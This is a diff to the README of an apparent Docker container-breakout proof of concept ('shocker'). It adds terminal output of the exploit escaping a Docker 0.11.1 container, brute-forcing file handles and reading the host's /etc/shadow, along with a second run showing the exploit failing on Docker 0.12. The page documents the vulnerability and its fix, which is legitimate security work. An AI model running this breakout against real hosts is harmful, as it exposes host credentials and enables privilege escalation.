@@ -19,22 +19,31 @@ To modify source and rebuild, use:
 
 ## Examples
 
-Ubuntu 12.04 LTS host running Docker 0.10
+Confirmed vulnerable: Docker 0.11.1 running Ubuntu 12.04 LTS
 
 ```
+root@precise64:~# docker version
+Client version: 0.11.1
+Client API version: 1.11
+Go version (client): go1.2.1
+Git commit (client): fb99f99
+Server version: 0.11.1
+Server API version: 1.11
+Git commit (server): fb99f99
+Go version (server): go1.2.1
+Last stable version: 1.0.0, please update docker
+
+root@precise64:~# docker info
+Containers: 6
+Images: 10
+Storage Driver: aufs
+ Root Dir: /var/lib/docker/aufs
+ Dirs: 22
+Execution Driver: native-0.2
+Kernel Version: 3.8.0-42-generic
+WARNING: No swap limit support
+
 root@precise64:~# docker run gabrtv/shocker
-Unable to find image 'gabrtv/shocker' locally
-Pulling repository gabrtv/shocker
-43a03e74839f: Download complete 
-511136ea3c5a: Download complete 
-e465fff03bce: Download complete 
-23f361102fae: Download complete 
-9db365ecbcbb: Download complete 
-ad892dd21d60: Download complete 
-c242002775ee: Download complete 
-a89c95ad2c32: Download complete 
-2c98114bb5ba: Download complete 
-2efa77e11c03: Download complete 
 [***] docker VMM-container breakout Po(C) 2014             [***]
 [***] The tea from the 90's kicks your sekurity again.     [***]
 [***] If you have pending sec consulting, I'll happily     [***]
@@ -44,23 +53,7 @@ a89c95ad2c32: Download complete
 [*] Found vagrant
 [*] Found lib64
 [*] Found usr
-[*] Found .
-[*] Found run
-[*] Found mnt
-[*] Found lost+found
-[*] Found srv
-[*] Found var
-[*] Found lib
-[*] Found sbin
-[*] Found root
-[*] Found dev
-[*] Found proc
-[*] Found sys
-[*] Found media
-[*] Found selinux
-[*] Found bin
-[*] Found opt
-[*] Found ..
+[*] Found ...
 [*] Found etc
 [+] Match: etc ino=3932161
 [*] Brute forcing remaining 32bit. This can take a while...
@@ -69,75 +62,7 @@ a89c95ad2c32: Download complete
 [*] Resolving 'shadow'
 [*] Found timezone
 [*] Found cron.hourly
-[*] Found grub.d
-[*] Found debian_version
-[*] Found mtab
-[*] Found sudoers.d
-[*] Found kernel
-[*] Found xml
-[*] Found hostname
-[*] Found vim
-[*] Found terminfo
-[*] Found nanorc
-[*] Found gssapi_mech.conf
-[*] Found services
-[*] Found rc2.d
-[*] Found resolv.conf
-[*] Found security
-[*] Found wgetrc
-[*] Found magic
-[*] Found lsb-release
-[*] Found pam.conf
-[*] Found cron.weekly
-[*] Found hdparm.conf
-[*] Found calendar
-[*] Found environment
-[*] Found rpc
-[*] Found issue
-[*] Found .
-[*] Found groff
-[*] Found crontab
-[*] Found shells
-[*] Found updatedb.conf
-[*] Found locale.alias
-[*] Found sudoers
-[*] Found rc4.d
-[*] Found rc3.d
-[*] Found X11
-[*] Found rcS.d
-[*] Found gshadow-
-[*] Found insserv.conf.d
-[*] Found sgml
-[*] Found rmt
-[*] Found init.d
-[*] Found group
-[*] Found resolvconf
-[*] Found rc5.d
-[*] Found group-
-[*] Found fonts
-[*] Found popularity-contest.conf
-[*] Found rc6.d
-[*] Found ucf.conf
-[*] Found vagrant_box_build_time
-[*] Found mailcap.order
-[*] Found default
-[*] Found netconfig
-[*] Found update-motd.d
-[*] Found newt
-[*] Found bash.bashrc
-[*] Found ntp.conf
-[*] Found adduser.conf
-[*] Found initramfs-tools
-[*] Found bash_completion.d
-[*] Found ca-certificates.conf
-[*] Found iscsi
-[*] Found libnl-3
-[*] Found motd.tail
-[*] Found lsb-base-logging.sh
-[*] Found ssh
-[*] Found securetty
-[*] Found ld.so.cache
-[*] Found modprobe.d
+...
 [*] Found skel
 [*] Found shadow
 [+] Match: shadow ino=3935729
@@ -175,7 +100,37 @@ vboxadd:!:15597::::::
 statd:*:15597:0:99999:7:::
 ```
 
-:( 
+Exploit fails on Docker 0.12:
+
+```
+root@precise64:~# docker version
+Client version: 0.12.0
+Client API version: 1.12
+Go version (client): go1.2.1
+Git commit (client): 14680bf
+Server version: 0.12.0
+Server API version: 1.12
+Go version (server): go1.2.1
+Git commit (server): 14680bf
+
+root@precise64:~# docker info
+Containers: 5
+Images: 10
+Storage Driver: aufs
+ Root Dir: /var/lib/docker/aufs
+ Dirs: 20
+Execution Driver: native-0.2
+Kernel Version: 3.8.0-42-generic
+WARNING: No swap limit support
+
+root@precise64:~# docker run gabrtv/shocker
+[***] docker VMM-container breakout Po(C) 2014             [***]
+[***] The tea from the 90's kicks your sekurity again.     [***]
+[***] If you have pending sec consulting, I'll happily     [***]
+[***] forward to my friends who drink secury-tea too!      [***]
+[*] Resolving 'etc/shadow'
+[-] open_by_handle_at: Operation not permitted
+```
 
 ## License
 
